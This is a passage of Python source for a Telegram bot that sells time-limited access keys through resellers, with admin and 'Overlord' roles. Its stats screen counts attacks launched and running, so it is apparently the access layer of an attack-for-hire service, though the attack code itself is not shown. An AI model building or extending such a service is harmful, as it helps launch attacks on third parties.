        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/redeem", f"Key: {key}, Context: {key_info['context']}", response)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["myinfo"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    info = []
    if user_id in users:
        user_info = users[user_id]
        expiration = user_info["expiration"]
        info.append(
            f"🔑 Key Status: Active\n"
            f"⏳ Expires: {expiration}\n"
            f"📍 Context: {user_info['context'].capitalize()}\n"
            f"🔑 Key: {user_info['key']}"
        )
    elif user_id in authorized_users:
        auth_info = authorized_users[user_id]
        expiration = auth_info["expiration"]
        info.append(
            f"🔑 Authorization Status: Active\n"
            f"⏳ Expires: {expiration}\n"
            f"📍 Chat Type: {auth_info['chat_type'].capitalize()}\n"
            f"👤 Added by: {auth_info['added_by']}"
        )
    else:
        info.append("🔑 Status: No active key or authorization")

    if user_id in resellers:
        reseller_info = resellers[user_id]
        info.append(
            f"💰 Reseller Balance: {reseller_info['balance']}\n"
            f"🔑 Keys Generated: {len(reseller_info.get('keys', []))}"
        )

    role = "Overlord" if is_overlord(user_id, username) else "Admin" if is_admin(user_id, username) else "User"
    info_text = "\n━━━━━━━━━━━━\n".join(info) or "No info available."
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>👤 My Info</i></b>\n"
        f"<b><i>🆔 UserID: {user_id}</i></b>\n"
        f"<b><i>👤 Username: @{username}</i></b>\n"
        f"<b><i>🎖️ Role: {role}</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{info_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", "", response)

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["stats"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_overlord(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Overlord only command!</i></b>\n"
            f"<b><i>Sirf Overlord stats dekh sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/stats", "", response)
        return

    command_usage_str = "\n".join([f"<b><i>📜 /{cmd}: {count}</i></b>" for cmd, count in stats["command_usage"].items()])
    active_keys = sum(1 for key, info in keys.items() if not info.get("blocked", False) and datetime.datetime.now(IST) < (datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST) + relativedelta(**{unit: val for unit, val in [("months", parse_duration(info["duration"])[3]), ("days", parse_duration(info["duration"])[2]), ("hours", parse_duration(info["duration"])[1]), ("minutes", parse_duration(info["duration"])[0])] if val})))
    memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02 + len(feedbacks) * 0.03
    latest_feedback = max([fb["timestamp"] for user_feedbacks in feedbacks.values() for fb in user_feedbacks.values()], default="None")

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>🌌 COSMIC BOT STATS (OVERLORD) 🌌</i></b>\n"
        f"<b><i>🔥 Overlord ji, yeh hai bot ka full dhamaka! 🔥</i></b>\n"
        f"<b><i>🔑 Total Keys Generated: {stats['total_keys']}</i></b>\n"
        f"<b><i>💥 Active Attacks Running: {stats['active_attacks']}</i></b>\n"
        f"<b><i>👥 Total Registered Users: {len(stats['total_users'])}</i></b>\n"
        f"<b><i>👤 Active Users (Last 5 min): {active_users_count}</i></b>\n"
        f"<b><i>🔑 Keys Generated/min: {calculate_keys_per_minute()}</i></b>\n"
        f"<b><i>🔓 Total Redeemed Keys: {stats['redeemed_keys']}</i></b>\n"
        f"<b><i>⏳ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>💥 Total Attacks Launched: {stats['total_attacks']}</i></b>\n"
        f"<b><i>⏱️ Avg Attack Duration: {calculate_avg_attack_duration()}</i></b>\n"
        f"<b><i>❌ Total Expired Keys: {stats['expired_keys']}</i></b>\n"
        f"<b><i>🔑 Active Keys: {active_keys}</i></b>\n"
        f"<b><i>👥 Peak Active Users: {stats['peak_active_users']}</i></b>\n"
        f"<b><i>📝 Total Feedbacks: {stats['total_feedbacks']}</i></b>\n"
        f"<b><i>📅 Latest Feedback: {latest_feedback}</i></b>\n"
        f"<b><i>⚙️ Memory Usage (Simulated): {memory_usage:.2f}MB</i></b>\n"
        f"<b><i>📊 Command Usage Stats:</i></b>\n{command_usage_str}\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>💾 Data Backup: {os.path.exists(BACKUP_DIR)}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    sent_message = bot.send_message(message.chat.id, append_compulsory_message(response), parse_mode="HTML")
    active_chats.add(message.chat.id)
    threading.Thread(target=live_stats_update, args=(message.chat.id, sent_message.message_id), daemon=True).start()
    log_action(user_id, username, "/stats", "", response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["addadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_overlord(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Overlord only command!</i></b>\n"
            f"<b><i>Sirf Overlord admins add kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Add Admin Guide</i></b>\n"
            f"<b><i>Usage: /addadmin <user_id or @username></i></b>\n"
            f"<b><i>Example: /addadmin 123456789 or /addadmin @username</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return

    admin_to_add = command_parts[1]
    if admin_to_add.startswith('@'):
        admin_usernames.add(admin_to_add.lower())
        added_id = admin_to_add
    else:
        admin_id.add(admin_to_add)
        added_id = admin_to_add

    save_data()
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>✅ Admin Added Successfully!</i></b>\n"
        f"<b><i>🆔 Admin: {added_id}</i></b>\n"
        f"<b><i>👤 Added by: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addadmin", f"Admin: {added_id}", response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["removeadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_overlord(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Overlord only command!</i></b>\n"
            f"<b><i>Sirf Overlord admins remove kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Remove Admin Guide</i></b>\n"
            f"<b><i>Usage: /removeadmin <user_id or @username></i></b>\n"
            f"<b><i>Example: /removeadmin 123456789 or /removeadmin @username</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return

    admin_to_remove = command_parts[1]
    removed = False
    if admin_to_remove.startswith('@'):
        if admin_to_remove.lower() in admin_usernames:
            admin_usernames.remove(admin_to_remove.lower())
            removed = True
            removed_id = admin_to_remove
    else:
        if admin_to_remove in admin_id:
            admin_id.remove(admin_to_remove)
            removed = True
            removed_id = admin_to_remove

    if removed:
        save_data()
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🗑️ Admin Removed Successfully!</i></b>\n"
            f"<b><i>🆔 Admin: {removed_id}</i></b>\n"
            f"<b><i>👤 Removed by: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Admin {admin_to_remove} not found!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removeadmin", f"Admin: {admin_to_remove}", response)

@bot.message_handler(commands=['checkadmin'])
def check_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["checkadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    admin_list = [f"🆔 {aid}" for aid in admin_id] + [f"👤 {ausername}" for ausername in admin_usernames]
    admin_text = "\n".join(admin_list) or "No admins found."
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>👥 Current Admins</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{admin_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkadmin", "", response)

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["start"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    role = "Overlord" if is_overlord(user_id, username) else "Admin" if is_admin(user_id, username) else "User"
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>🌌 Welcome to SupremeBot! 🌌</i></b>\n"
        f"<b><i>🔥 Bhai, yeh bot hai ekdum bhaukal! 🚀</i></b>\n"
        
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>🎖️ Role: {role}</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📜 Available Commands:</i></b>\n"
        f"<b><i>/start - Yeh welcome message dekho</i></b>\n"
        f"<b><i>/myinfo - Apni details check karo</i></b>\n"
        f"<b><i>/redeem <key> - Key redeem karo access ke liye</i></b>\n"
        f"<b><i>/feedback <message> - Apna feedback bhejo</i></b>\n"
        f"<b><i>/checkcooldown - Cooldown time check karo</i></b>\n"
        f"<b><i>/help - All commands ki list dekho</i></b>\n"
    )

    if is_admin(user_id, username) or is_overlord(user_id, username):
        response += (
            f"<b><i>🔐 Admin Commands:</i></b>\n"
            f"<b><i>/logs - Recent bot logs dekho</i></b>\n"
            f"<b><i>/users - Authorized users ki list dekho</i></b>\n"
            f"<b><i>/resellers - Resellers ki list dekho</i></b>\n"
            f"<b><i>/setcooldown <seconds> - Cooldown time set karo</i></b>\n"
        )

    if is_overlord(user_id, username):
        response += (
            f"<b><i>👑 Overlord Commands:</i></b>\n"
            f"<b><i>/stats - Bot ke full stats dekho</i></b>\n"
            f"<b><i>/addadmin <user_id or @username> - Naya admin add karo</i></b>\n"
            f"<b><i>/removeadmin <user_id or @username> - Admin hatao</i></b>\n"
            f"<b><i>/checkadmin - Current admins ki list dekho</i></b>\n"
            f"<b><i>/addreseller <user_id> - Naya reseller add karo</i></b>\n"
            f"<b><i>/removereseller <user_id> - Reseller hatao</i></b>\n"
            f"<b><i>/addbalance <user_id> <amount> - Reseller ka balance badhao</i></b>\n"
            f"<b><i>/genkey <duration> [context] - Naya key generate karo</i></b>\n"
        )

    if user_id in resellers:
        response += (
            f"<b><i>💰 Reseller Commands:</i></b>\n"
            f"<b><i>/genkey <duration> [context] - Naya key generate karo</i></b>\n"
            f"<b><i>💵 Balance: {resellers[user_id]['balance']}</i></b>\n"
        )

    response += (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    safe_reply(bot, message, response)
    log_action(user_id, username, "/start", "", response)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["myinfo"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    info = []
    if user_id in users:
        user_info = users[user_id]
        expiration = user_info["expiration"]
        info.append(
            f"🔑 Key Status: Active\n"
            f"⏳ Expires: {expiration}\n"
            f"📍 Context: {user_info['context'].capitalize()}\n"
            f"🔑 Key: {user_info['key']}"
        )
    elif user_id in authorized_users:
        auth_info = authorized_users[user_id]
        expiration = auth_info["expiration"]
        info.append(
            f"🔑 Authorization Status: Active\n"
            f"⏳ Expires: {expiration}\n"
            f"📍 Chat Type: {auth_info['chat_type'].capitalize()}\n"
            f"👤 Added by: {auth_info['added_by']}"
        )
    else:
        info.append("🔑 Status: No active key or authorization")

    if user_id in resellers:
        reseller_info = resellers[user_id]
        info.append(
            f"💰 Reseller Balance: {reseller_info['balance']}\n"
            f"🔑 Keys Generated: {len(reseller_info.get('keys', []))}"
        )

    role = "Overlord" if is_overlord(user_id, username) else "Admin" if is_admin(user_id, username) else "User"
    info_text = "\n━━━━━━━━━━━━\n".join(info) or "No info available."
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>👤 My Info</i></b>\n"
        f"<b><i>🆔 UserID: {user_id}</i></b>\n"
        f"<b><i>👤 Username: @{username}</i></b>\n"
        f"<b><i>🎖️ Role: {role}</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{info_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", "", response)

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["redeem"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Redeem Key Guide</i></b>\n"
            f"<b><i>Usage: /redeem <key></i></b>\n"
            f"<b><i>Example: /redeem ABC12345</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return

    key = command_parts[1]
    if key not in keys:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Invalid or Expired Key!</i></b>\n"
            f"<b><i>🔑 Key: {key}</i></b>\n"
            f"<b><i>Contact @Rahul_618 for a valid key.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    key_info = keys[key]
    if key_info.get("blocked", False):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🔒 Key Blocked!</i></b>\n"
            f"<b><i>🔑 Key: {key}</i></b>\n"
            f"<b><i>Contact @Rahul_618 for assistance.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
    minutes, hours, days, months = parse_duration(key_info["duration"])
    expiration = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)

    if datetime.datetime.now(IST) > expiration:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Key Expired!</i></b>\n"
            f"<b><i>🔑 Key: {key}</i></b>\n"
            f"<b><i>Contact @Rahul_618 for a new key.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    users[user_id] = {
        "expiration": expiration.strftime('%Y-%m-%d %I:%M:%S %p'),
        "context": key_info["context"],
        "key": key
    }
    stats["redeemed_keys"] += 1
    save_data()

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>🎉 Key Redeemed Successfully!</i></b>\n"
        f"<b><i>🔑 Key: {key}</i></b>\n"
        f"<b><i>⏳ Duration: {key_info['duration']}</i></b>\n"
        f"<b><i>📍 Context: {key_info['context'].capitalize()}</i></b>\n"
        f"<b><i>⏰ Expires: {expiration.strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/redeem", f"Key: {key}, Context: {key_info['context']}", response)

@bot.message_handler(commands=['feedback'])
def feedback_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["feedback"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Feedback Guide</i></b>\n"
            f"<b><i>Usage: /feedback <message></i></b>\n"
            f"<b><i>Example: /feedback Bot is awesome!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/feedback", f"Command: {command}", response)
        return

    feedback_text = command_parts[1]
    feedbacks.setdefault(user_id, {})[str(datetime.datetime.now(IST))] = feedback_text
    stats["total_feedbacks"] += 1
    save_data()

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>📝 Feedback Submitted!</i></b>\n"
        f"<b><i>💬 Message: {feedback_text}</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/feedback", f"Feedback: {feedback_text}", response)

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["checkcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
